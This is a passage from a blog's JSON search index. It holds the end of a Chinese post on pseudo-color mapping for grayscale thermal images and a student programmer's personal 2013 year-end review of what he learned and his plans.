颜色映射的方法需要做一个颜色映射表，不同灰度级都会有对应的颜色。这个跟强度分层法相似，可以分成不同的层次，对应的颜色可以根据实际情况做映射。在实际应用中，热成像测温系统所产生的红外图像为黑白灰度级图像，灰度值动态范围不大，人眼很难从这些灰度级中获得丰富的信息。为了更直观地增强显示图像的层次，提高人眼分辨能力，对系统所摄取的图像进行伪彩色处理，从而达到图像增强的效果，使图像信息更加丰富。例如对受热物体所成的像进行伪彩色时，将灰度低的区域设置在蓝色附近(或蓝灰、黑等)，而灰度级高的区域设置在红色附近(或棕红、白等)，以方便人们对物体的观察。 下面几张图片是在实际应用中的情况（图片来源网络，侵删）： xmind文件","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://noogel.xyz/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://noogel.xyz/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"写在2013年末","slug":"关于生活/年/写在2013年末","date":"2014-01-29T00:00:00.000Z","updated":"2025-07-23T07:30:58.920Z","comments":true,"path":"2014/01/29/1.html","link":"","permalink":"https://noogel.xyz/2014/01/29/1.html","excerpt":"","text":"微弱的灯光驱散浓重的夜色，压低的歌声怕惊醒梦中人。 又是深夜，双手在键盘上飞舞，闪烁的光标不断向前推进，一行行的注释和代码呈现在屏幕上，对于我来说这便成为了一种习惯，喜欢在深夜学习编程，接触编程有两年半了，非睡眠状态下的大部分时间都贡献给了我手中这台笔记本电脑，现在被我的朋友称之为我的“媳妇”。哈哈，因为她对于我来说兴趣很浓，我从不迷恋游戏，只是偶尔玩玩，也很少购物，电影基本不看，只是偶尔听听歌，还是敲代码的时候。转眼这不又是要过年了，该来点总结了，看看都学了什么，有什么体会都要来写写的。 主要学习的语言是C#，两年半的时间大部分都是用C#在编程；当然对C++&#x2F;Java也是比较熟悉的，给点代码也是能看懂什么意思的。对汇编语言也有所了解，目前正在学习中。那下面就是要讲讲主攻技能.NET平台下的学习细节了： ASP.NET网站开发方面能做出个像模像样的网站，但是不能保证效率；熟悉三层架构，用的比较烂；对于难理解的HttpModule、HttpHandler有些了解。 Winform方面百分之八十的控件能熟练使用，剩下的就是感觉不好用的了，这里的熟练使用是了解并使用过常用的属性、方法、事件。 再有就是关于多线程、网络编程、数字图像处理、单元测试等等升级技能也是用的比较不错，专门买过书学习过。 像一些附加技能的话如HTML&#x2F;CSS用的还是比较不错的，至少能做出能拿得出手的网页去，各种效果咱不会写还不会“偷”吗，其实就是拷贝网上现有的呗。JS&#x2F;jQuery这些吗，实话是没有怎么接触，也基本能写一点点的，都不好意思说了。不想走网站开发方面，感觉没有前途，也不好玩，就学了一年就止步了。 再有就是编程的基本功，像数据结构、操作系统、算法、数据库这些知识是学会六分左右，现在正在补习其余的四分，并且是努力的在夯实这方面欠缺的。至于软件工程的知识我觉得是先有所了解然后在工作中主键掌握并熟练运用。 最大的优点是对计算机软件技术充满了热情，乐死不疲的。各种好玩的新技术都想鼓捣一下，比如：Wifi共享、RamDisk、远程开机等等。 不足之处是不太爱说话，喜欢熬夜。 目前学习计划： 数据结构+算法 Unity3D游戏开发 职业规划还木有想好，因为还未毕业，干嘛这么早就草率决定，等工作一两年之后再说呗，定居城市也是这样。但是目前来说不想一直走.NET发展路线，先打好基本功到时候好转行。 2014年，把前半年的时间用在刀刃上，学习的技能放在毕业找的工作方面。另外要努力学习英语，这个也是个大大的重点。","categories":[],"tags":[{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"}]}],"categories":[{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/categories/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://noogel.xyz/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"系统设计","slug":"系统设计","permalink":"https://noogel.xyz/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"},{"name":"项目","slug":"项目","permalink":"https://noogel.xyz/tags/%E9%A1%B9%E7%9B%AE/"},{"name":"架构","slug":"架构","permalink":"https://noogel.xyz/tags/%E6%9E%B6%E6%9E%84/"},{"name":"效率","slug":"效率","permalink":"https://noogel.xyz/tags/%E6%95%88%E7%8E%87/"},{"name":"HEXO","slug":"HEXO","permalink":"https://noogel.xyz/tags/HEXO/"},{"name":"Docker","slug":"Docker","permalink":"https://noogel.xyz/tags/Docker/"},{"name":"模板","slug":"模板","permalink":"https://noogel.xyz/tags/%E6%A8%A1%E6%9D%BF/"},{"name":"软技能","slug":"软技能","permalink":"https://noogel.xyz/tags/%E8%BD%AF%E6%8A%80%E8%83%BD/"},{"name":"招聘","slug":"招聘","permalink":"https://noogel.xyz/tags/%E6%8B%9B%E8%81%98/"},{"name":"书单","slug":"书单","permalink":"https://noogel.xyz/tags/%E4%B9%A6%E5%8D%95/"},{"name":"领域驱动设计","slug":"领域驱动设计","permalink":"https://noogel.xyz/tags/%E9%A2%86%E5%9F%9F%E9%A9%B1%E5%8A%A8%E8%AE%BE%E8%AE%A1/"},{"name":"游记","slug":"游记","permalink":"https://noogel.xyz/tags/%E6%B8%B8%E8%AE%B0/"},{"name":"中间件","slug":"中间件","permalink":"https://noogel.xyz/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"},{"name":"重构","slug":"重构","permalink":"https://noogel.xyz/tags/%E9%87%8D%E6%9E%84/"},{"name":"设计模式","slug":"设计模式","permalink":"https://noogel.xyz/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"系统建模","slug":"系统建模","permalink":"https://noogel.xyz/tags/%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1/"},{"name":"MySQL","slug":"MySQL","permalink":"https://noogel.xyz/tags/MySQL/"},{"name":"编程语言","slug":"编程语言","permalink":"https://noogel.xyz/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"闲聊","slug":"闲聊","permalink":"https://noogel.xyz/tags/%E9%97%B2%E8%81%8A/"},{"name":"计划","slug":"计划","permalink":"https://noogel.xyz/tags/%E8%AE%A1%E5%88%92/"},{"name":"算法","slug":"算法","permalink":"https://noogel.xyz/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"https://noogel.xyz/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"Redis","slug":"Redis","permalink":"https://noogel.xyz/tags/Redis/"},{"name":"网络","slug":"网络","permalink":"https://noogel.xyz/tags/%E7%BD%91%E7%BB%9C/"},{"name":"数据库","slug":"数据库","permalink":"https://noogel.xyz/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"自律","slug":"自律","permalink":"https://noogel.xyz/tags/%E8%87%AA%E5%BE%8B/"},{"name":"术语","slug":"术语","permalink":"https://noogel.xyz/tags/%E6%9C%AF%E8%AF%AD/"},{"name":"认知","slug":"认知","permalink":"https://noogel.xyz/tags/%E8%AE%A4%E7%9F%A5/"},{"name":"理财","slug":"理财","permalink":"https://noogel.xyz/tags/%E7%90%86%E8%B4%A2/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://noogel.xyz/tags/Ubuntu/"},{"name":"结算","slug":"结算","permalink":"https://noogel.xyz/tags/%E7%BB%93%E7%AE%97/"},{"name":"Xpath","slug":"Xpath","permalink":"https://noogel.xyz/tags/Xpath/"},{"name":"机器学习","slug":"机器学习","permalink":"https://noogel.xyz/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"网络安全","slug":"网络安全","permalink":"https://noogel.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"正则表达式","slug":"正则表达式","permalink":"https://noogel.xyz/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"分布式系统","slug":"分布式系统","permalink":"https://noogel.xyz/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"},{"name":"SQL","slug":"SQL","permalink":"https://noogel.xyz/tags/SQL/"}]}